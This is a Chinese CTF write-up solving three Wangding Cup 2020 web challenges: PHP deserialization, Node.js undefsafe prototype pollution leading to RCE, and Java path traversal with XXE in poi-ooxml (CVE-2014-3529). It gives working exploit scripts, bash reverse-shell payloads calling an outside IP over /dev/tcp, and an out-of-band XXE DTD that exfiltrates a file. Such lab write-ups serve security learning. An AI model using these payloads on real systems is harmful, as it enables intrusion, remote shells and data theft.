+++
title = "网鼎杯2020青龙组"
slug = "wangding-cup-2020-qinglong-group"
description = "刷"
date = "2024-08-13T10:53:55"
lastmod = "2024-08-13T10:53:55"
image = ""
license = ""
categories = ["复现"]
tags = []
+++

# [网鼎杯 2020 青龙组]AreUSerialz

一个反序列化

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

这道题就是很基础的反序列化绕过,其中

```
		if($this->op === "2"){
            $this->op = "1";
            }
            
            if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        }
```

这里直接上传数字就可以绕过读取文件了

第一种我们直接使用`public`来绕过

低版本的 `php` 对类型不敏感

```php
<?php
class FileHandler{
    public $op=2;
    public $filename='flag.php';
    public $content;
}
$a=urlencode(serialize(new FileHandler()));
echo $a;
?>
```

传参即可得到`flag`

还有一种我们本身写`protected`是需要将不可见字符处理一下的,这里为了绕过我们采用16进制绕过补充一个知识点

```
S:11:"\00*\00password";

s:11:"%00*%00password";
```

等效所以poc是这样的

```php
<?php
class FileHandler{
    protected $op=2;
    protected $filename='flag.php';
    protected $content;
}
$a=(serialize(new FileHandler()));
echo $a;
$b=str_replace('%00','\\00',$a);
//echo $b;
$c=str_replace('s','S',$b);
echo $c;
// function is_valid($c) {
//     for($i = 0; $i < strlen($c); $i++)
//         if(!(ord($c[$i]) >= 32 && ord($c[$i]) <= 125))
//             echo 0;
//     echo 1;
// }
// is_valid($c);
// function is_valid($b) {
//     for($i = 0; $i < strlen($b); $i++)
//         if(!(ord($b[$i]) >= 32 && ord($b[$i]) <= 125))
//             echo "no";
//     echo 1;
// }
// is_valid($b);
?>
```

注释比较多,因为中途尝试了能否绕过什么的

# [网鼎杯 2020 青龙组]notes

下载源码之后一进来就看到`exec`估计是污染之后进行`RCE`

```js
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
```

```js
edit_note(id, author, raw) { 
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }
```

这里有个污染漏洞,第二个和第三个参数可控,并且可以直接载入污染,后面就可以进行RCE了

```python
/edit_note
POST:
id=__proto__&author=bash -i > /dev/tcp/27.25.151.48/9999 0>&1&raw=1
然后访问/status
```

```python
import requests

r = requests.Session()
url = 'http://fbcff985-9c57-4932-be04-1aa47f5fec66.node5.buuoj.cn:81/'

a=r.post(url + '/edit_note', data={
      'id': '__proto__',
      'author': '/bin/bash -i >&/dev/tcp/ip/7777 0>&1',
      'raw': 'xxx',
  })
print(a.status_code,a.text)
b=r.get(url + '/status')
print(b.status_code,b.text)
```

即可弹`shell`

# [网鼎杯 2020 青龙组]filejava

进入网页,观察url,尝试目录穿越成功

`/DownloadServlet?filename=../../../WEB-INF/web.xml`得到xml

```

<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/DownloadServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>ListFileServlet</servlet-name>
        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>ListFileServlet</servlet-name>
        <url-pattern>/ListFileServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/UploadServlet</url-pattern>
    </servlet-mapping>
</web-app>
```

然后查看三个类，发现上传有问题

`/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class`

```java

import cn.abc.servlet.UploadServlet;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.UUID;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileItemFactory;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;

public class UploadServlet extends HttpServlet {
  private static final long serialVersionUID = 1L;
  
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    doPost(request, response);
  }
  
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String savePath = getServletContext().getRealPath("/WEB-INF/upload");
    String tempPath = getServletContext().getRealPath("/WEB-INF/temp");
    File tempFile = new File(tempPath);
    if (!tempFile.exists())
      tempFile.mkdir(); 
    String message = "";
    try {
      DiskFileItemFactory factory = new DiskFileItemFactory();
      factory.setSizeThreshold(102400);
      factory.setRepository(tempFile);
      ServletFileUpload upload = new ServletFileUpload((FileItemFactory)factory);
      upload.setHeaderEncoding("UTF-8");
      upload.setFileSizeMax(1048576L);
      upload.setSizeMax(10485760L);
      if (!ServletFileUpload.isMultipartContent(request))	//判断是否是文件上传请求
        return; 
      List<FileItem> list = upload.parseRequest(request);
      for (FileItem fileItem : list) {
        if (fileItem.isFormField()) {
          String name = fileItem.getFieldName();
          String str = fileItem.getString("UTF-8");
          continue;
        } 
        String filename = fileItem.getName();
        if (filename == null || filename.trim().equals(""))
          continue; 
        String fileExtName = filename.substring(filename.lastIndexOf(".") + 1);
        InputStream in = fileItem.getInputStream();
        if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);		//获取excel第一个sheet
            System.out.println(sheet.getFirstRowNum());	//打印第一个实际行的下标
          } catch (InvalidFormatException e) {
            System.err.println("poi-ooxml-3.10 has something wrong");
            e.printStackTrace();
          }  
        String saveFilename = makeFileName(filename);
        request.setAttribute("saveFilename", saveFilename);
        request.setAttribute("filename", filename);
        String realSavePath = makePath(saveFilename, savePath);
        FileOutputStream out = new FileOutputStream(realSavePath + "/" + saveFilename);
        byte[] buffer = new byte[1024];
        int len = 0;
        while ((len = in.read(buffer)) > 0)
          out.write(buffer, 0, len); 
        in.close();
        out.close();
        message = ";
      } 
    } catch (FileUploadException e) {
      e.printStackTrace();
    } 
    request.setAttribute("message", message);
    request.getRequestDispatcher("/ListFileServlet").forward((ServletRequest)request, (ServletResponse)response);
  }
  
  private String makeFileName(String filename) {
    return UUID.randomUUID().toString() + "_" + filename;
  }
  
  private String makePath(String filename, String savePath) {
    int hashCode = filename.hashCode();
    int dir1 = hashCode & 0xF;
    int dir2 = (hashCode & 0xF0) >> 4;
    String dir = savePath + "/" + dir1 + "/" + dir2;
    File file = new File(dir);
    if (!file.exists())
      file.mkdirs(); 
    return dir;
  }
}

```

当上传文件以`execel-`开头，并且是`xlsx`后缀时，使用poi解析xlsx文件并打印第一个sheet的第一个有效行行号。

```java
// 当文件为excel-xxxxx.xlsx的时候，读取excel文件并打印行数，这里用的是poi-ooxml-3.10，存在xxe漏洞
        if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);
            System.out.println(sheet.getFirstRowNum());
          } catch (InvalidFormatException e) {
            System.err.println("poi-ooxml-3.10 has something wrong");
            e.printStackTrace();
          }  

```



**CVE-2014-3529**

新建一个xlsx `excel-a.xlsx`，使用压缩工具打开这个xlsx，修改其中的`[Content_Types].xml`。

内容为

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/poc.dtd">
%remote;%int;%send;
]>
<root>&send;</root>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>
```

poc.dtd

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://ip:9999/%file;'>">
```

上传文件然后监听9999

